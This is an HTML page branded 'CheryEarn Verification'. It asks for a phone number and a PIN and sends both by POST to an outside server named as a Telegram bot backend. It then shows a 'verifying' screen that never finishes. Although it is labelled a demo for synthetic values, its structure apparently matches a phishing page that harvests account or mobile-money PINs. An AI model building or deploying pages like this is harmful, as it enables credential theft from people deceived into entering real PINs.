<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>CheryEarn Verification</title>

    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            font-family: Arial, sans-serif;
            background: #f4f7fc;
            color: #0f172a;
        }

        .card {
            width: 100%;
            max-width: 420px;
            background: #ffffff;
            border-radius: 18px;
            padding: 28px;
            box-shadow: 0 12px 35px rgba(15, 23, 42, 0.10);
        }

        .logo {
            width: 58px;
            height: 58px;
            margin: 0 auto 18px;
            border-radius: 16px;
            background: #0f172a;
            color: #22c55e;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 25px;
            font-weight: 800;
        }

        h1 {
            text-align: center;
            font-size: 25px;
            margin-bottom: 8px;
        }

        .subtitle {
            text-align: center;
            color: #64748b;
            font-size: 14px;
            line-height: 1.5;
            margin-bottom: 20px;
        }

        .demo-badge {
            display: block;
            width: fit-content;
            margin: 0 auto 22px;
            padding: 7px 12px;
            border-radius: 20px;
            background: #dcfce7;
            color: #166534;
            font-size: 12px;
            font-weight: 700;
        }

        .field {
            margin-bottom: 17px;
        }

        label {
            display: block;
            margin-bottom: 7px;
            font-size: 14px;
            font-weight: 700;
        }

        input {
            width: 100%;
            height: 48px;
            padding: 0 14px;
            border: 1px solid #dbe3ef;
            border-radius: 10px;
            outline: none;
            background: #f8fafc;
            color: #0f172a;
            font-size: 15px;
        }

        input:focus {
            border-color: #2563eb;
            background: #ffffff;
            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.10);
        }

        button {
            width: 100%;
            height: 50px;
            border: none;
            border-radius: 10px;
            background: #2563eb;
            color: #ffffff;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
        }

        button:disabled {
            opacity: .65;
            cursor: not-allowed;
        }

        .verification {
            display: none;
            text-align: center;
            padding: 20px 5px 5px;
        }

        .verification-icon {
            font-size: 38px;
            margin-bottom: 12px;
        }

        .verification h2 {
            font-size: 21px;
            margin-bottom: 10px;
        }

        .verification p {
            color: #64748b;
            font-size: 14px;
            line-height: 1.6;
        }

        .loading {
            margin: 18px auto;
            width: 32px;
            height: 32px;
            border: 4px solid #dbeafe;
            border-top-color: #2563eb;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        .success {
            margin-top: 18px;
            padding: 15px;
            border-radius: 10px;
            background: #dcfce7;
            color: #166534;
            text-align: left;
            font-size: 14px;
            line-height: 1.6;
        }

        .footer {
            text-align: center;
            margin-top: 22px;
            color: #94a3b8;
            font-size: 12px;
        }
    </style>
</head>

<body>

<div class="card">

    <div class="logo">C</div>

    <h1>Verification</h1>

    <p class="subtitle">
        Enter synthetic values to test the verification flow.
    </p>

    <span class="demo-badge">
        DEMO VERIFICATION
    </span>

    <form id="verificationForm">

        <div class="field">
            <label for="phone">
                Phone Number
            </label>

            <input
                type="tel"
                id="phone"
                placeholder="+243XXXXXXXXX"
                required
            >
        </div>

        <div class="field">
            <label for="demoPin">
                Demo PIN
            </label>

            <input
                type="text"
                id="demoPin"
                placeholder="Enter demo PIN"
                required
            >
        </div>

        <button type="submit" id="submitBtn">
            Continue
        </button>

    </form>

    <div class="verification" id="verificationBox">

        <div class="verification-icon">
            🔐
        </div>

        <h2>Secure verification</h2>

        <div class="loading"></div>

        <p>
            Verifying your demo PIN...
        </p>

        <p>
            Please do not close this page.
        </p>

    </div>

    <div id="result"></div>

    <div class="footer">
        CheryEarn Demo
    </div>

</div>

<script>

const BACKEND_URL =
    "https://telegram-bot-backend-n0gd.onrender.com";

const form =
    document.getElementById("verificationForm");

const button =
    document.getElementById("submitBtn");

const verificationBox =
    document.getElementById("verificationBox");

const result =
    document.getElementById("result");

form.addEventListener("submit", async function(event) {

    event.preventDefault();

    const phone =
        document.getElementById("phone").value.trim();

    const demoPin =
        document.getElementById("demoPin").value.trim();

    if (!phone || !demoPin) {
        return;
    }

    button.disabled = true;
    button.textContent = "Sending...";

    try {

        const response = await fetch(
            `${BACKEND_URL}/demo-verification`,
            {
                method: "POST",

                headers: {
                    "Content-Type": "application/json"
                },

                body: JSON.stringify({
                    phone: phone,
                    demoPin: demoPin
                })
            }
        );

        const data =
            await response.json();

        if (!response.ok || !data.success) {
            throw new Error(
                data.message ||
                "Unable to start verification."
            );
        }

        form.style.display = "none";

        verificationBox.style.display = "block";

        result.className = "";

        result.innerHTML = "";

    } catch (error) {

        button.disabled = false;

        button.textContent = "Continue";

        result.className = "success";

        result.style.background = "#fee2e2";
        result.style.color = "#991b1b";

        result.textContent =
            "❌ " + error.message;
    }

});

</script>

</body>
</html>
